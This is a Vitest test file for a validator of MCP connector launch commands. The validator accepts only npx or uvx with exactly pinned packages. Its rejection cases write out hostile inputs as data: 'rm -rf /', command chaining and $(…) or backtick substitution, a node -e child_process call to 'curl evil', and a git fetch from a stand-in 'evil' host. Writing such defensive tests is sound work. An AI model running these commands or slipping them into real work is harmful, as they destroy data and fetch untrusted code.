import { describe, expect, it } from "vitest";
import {
  assertStdioCommandSafe,
  isStdioCommandSafe,
  ConnectorCommandUnsafeError,
} from "../services/mcp-connector-command-safety.js";

describe("assertStdioCommandSafe — accepts a pinned launcher package", () => {
  it.each([
    ["npx", ["-y", "@notionhq/notion-mcp-server@1.9.0"]],
    ["npx", ["@modelcontextprotocol/server-filesystem@2024.11.5", "/tmp/workdir"]],
    ["npx", ["-y", "server-thing@1.2.3-rc.1"]],
    ["uvx", ["mcp-server-git@1.2.3"]],
    ["uvx", ["some-tool@1.2"]], // major.minor is a valid exact pin
    ["npx", ["-y", "@scope/pkg@10.0.0", "--server-flag", "value with spaces"]],
    ["npx", ["-y", "pkg@1.0.0", "C:\\Users\\me\\dir"]], // Windows path (backslash) is fine
  ])("accepts %s %j", (command, args) => {
    expect(() => assertStdioCommandSafe(command, args)).not.toThrow();
    expect(isStdioCommandSafe(command, args)).toBe(true);
  });
});

describe("assertStdioCommandSafe — rejects unsafe commands", () => {
  it.each([
    ["node", ["-e", "require('child_process').exec('curl evil')"], "not_a_launcher"],
    ["sh", ["-c", "rm -rf /"], "not_a_launcher"],
    ["bash", [], "not_a_launcher"],
    ["docker", ["run", "x"], "not_a_launcher"],
    ["/usr/bin/npx", ["pkg@1.2.3"], "not_a_launcher"], // full path is not the bare launcher
    ["npx", ["@notionhq/notion-mcp-server"], "unpinned_package"], // no @version
    ["npx", ["-y", "pkg@latest"], "unpinned_package"],
    ["npx", ["pkg@^1.2.3"], "unpinned_package"], // range
    ["npx", ["pkg@1.x"], "unpinned_package"], // wildcard
    ["npx", ["--package", "x", "--call", "y"], "disallowed_flag"],
    ["uvx", ["--from", "git+https://evil/x", "pkg@1.0.0"], "disallowed_flag"],
    ["npx", ["-e", "pkg@1.0.0"], "disallowed_flag"],
    ["npx", ["-y", "pkg@1.0.0", "; rm -rf /"], "disallowed_character"], // chaining
    ["npx", ["-y", "pkg@1.0.0", "$(evil)"], "disallowed_character"], // substitution
    ["npx", ["-y", "`evil`"], "disallowed_character"], // backtick
    ["npx", [], "no_package"],
    ["", ["pkg@1.0.0"], "missing_command"],
  ])("rejects %s %j → %s", (command, args, reason) => {
    let thrown: unknown;
    try {
      assertStdioCommandSafe(command, args);
    } catch (e) {
      thrown = e;
    }
    expect(thrown).toBeInstanceOf(ConnectorCommandUnsafeError);
    expect((thrown as ConnectorCommandUnsafeError).reason).toBe(reason);
    expect(isStdioCommandSafe(command, args)).toBe(false);
  });
});
